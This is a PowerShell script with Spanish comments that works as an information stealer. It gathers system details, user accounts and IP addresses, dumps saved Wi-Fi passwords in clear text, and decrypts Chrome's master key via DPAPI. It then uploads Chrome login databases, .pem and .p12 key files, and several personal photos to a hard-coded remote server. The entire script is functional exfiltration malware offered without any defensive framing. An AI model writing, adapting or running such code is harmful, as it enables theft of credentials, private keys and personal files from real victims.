# Crear archivo donde se guardara toda la informacion extraida
$cont = "$env:TEMP/data_msg.txt" 
$server = "http://3.83.44.2:8082"

# INformación general del sistema 
systeminfo | Where-Object { $_ -match "^(Nombre del sistema operativo|Versión del sistema operativo|Fabricante del sistema|Modelo del sistema|Dominio|Modelo el sistema|OS Name|OS Version|System Manufacturer|System Model|Domain):" } > $cont



$whoami = whoami
echo "whoami: $whoami" >> $cont

#Obetener Usuarios y su estado
Get-LocalUser | Select-Object "Name", "Enabled"  >> $cont


# Interfaces e IPs

							
#Get-NetIPAddress | Where-Object { $_.IPAddress -match "\d+\.\d+\.\d+\.\d+" } | Select-Object InterfaceAlias, #IPAddress >> $cont

Get-NetIPAddress | Where-Object { $_.IPAddress -match "\d+\.\d+\.\d+\.\d+" } | ForEach-Object {
    "Interfaz: $($.InterfaceAlias) - IP: $($.IPAddress)"
} >> $cont

# IP publica
$ip_publica = Invoke-RestMethod -Uri "https://api.ipify.org" 
echo "IP PUBLICA: $ip_publica" >> $cont



# Obtener redes wifi guardaras (SSID y Clave) 

netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $network = ($_ -split ":")[1].Trim()
    $key = (netsh wlan show profile name="$network" key=clear | Select-String "Key Content").Line -split ":" | Select-Object -Last 1
    if ($key) { Write-Output "$network : $key" }
}>> $cont

netsh wlan show profiles | Select-String "Perfil de usuario de todas" | ForEach-Object {
    $network = ($_ -split ":")[1].Trim()
    $key = (netsh wlan show profile name="$network" key=clear | Select-String "Contenido de la clave").Line -split ":" | Select-Object -Last 1
    if ($key) { Write-Output "$network : $key" }
} >> $cont




# _______________ Extraccion de credenciales
 

# LOCAL STATE ( archivo que contiene la clave para el descifrado)

# Cargar el archivo Local State y obtener la clave cifrada
$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json

# Obtener la clave cifrada
$encryptedKey = [System.Convert]::FromBase64String($localStateContent.os_crypt.encrypted_key)

# Eliminar los primeros 5 bytes (prefijo 'DPAPI')
$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]


# agregar paquete necesario para el descifrado
Add-Type -Path "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.dll"

# Desencriptar la clave usando DPAPI (esto usa la clave de usuario actual en el sistema)
$dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)


# Convertir la clave binaria a un string base64 para guardarla o usarla más fácilmente
$base64Key = [Convert]::ToBase64String($dpapiKey) 
echo "PASSWORD: $base64Key" >> $cont


#Extraer y enviar LOGIN DATA (BASE DE DATOS con credenciales SQLITE)

$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\"

$profiles = Get-ChildItem $path | Where-Object { $_.Name -like "Profile*"} | Select-Object "Name"
if ($profiles) {
    foreach ($profile in $profiles) {
        $file_name = $profile.Name -replace " ", ""
        $file_logins = "$env:LOCALAPPDATA\Google\Chrome\User Data\$($profile.Name)\login data"
        Invoke-WebRequest -Uri "$server/upload_file/login_data_$env:USERNAME_$file_name" -Method PUT -InFile $file_logins -ContentType "application/octet-stream"
    }
}
else {
    $file_logins = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\login data"
    Invoke-WebRequest -Uri "$server/upload_file/login_data_$env:USERNAME_default" -Method PUT -InFile $file_logins -ContentType "application/octet-stream"
}

# ENNVIO CONT
Invoke-RestMethod -Uri "$server/receive_text" -Method PUT -Body (Get-Content $cont -Raw) -ContentType "text/plain"




# _______________________ Buscar y Enviar archivos .pem y .p12

# Buscar archivos .pem y .p12 en la carpeta de Documentos
$docsPath = [System.IO.Path]::Combine($env:USERPROFILE, "Documents")
$signFiles = Get-ChildItem -Path $docsPath -Include *.pem, *.p12 -Recurse

if ($signFiles) {
    foreach ($file in $signFiles) {
        Invoke-WebRequest -Uri "$server/upload_file/$($file.Name)" -Method PUT -InFile $file.FullName -ContentType "application/octet-stream"
    }
} else {
    Write-Host "No se encontraron archivos .pem o .p12 en la carpeta de Documentos."
}

# _______________________ Buscar y Enviar imágenes (3 fotos)

# Buscar las primeras 3 imágenes en la carpeta de Imágenes
$imagesPath = [System.IO.Path]::Combine($env:USERPROFILE, "Pictures")
$imageFiles = Get-ChildItem -Path $imagesPath -Include *.jpg, *.jpeg, *.png -Recurse | Select-Object -First 3

if ($imageFiles) {
    foreach ($image in $imageFiles) {
	Invoke-RestMethod -Uri "$server/upload_image" -Method POST -InFile $image.FullName -ContentType "application/octet-stream"
	}
} else {
    Write-Host "No se encontraron imágenes en la carpeta de Imágenes."
}
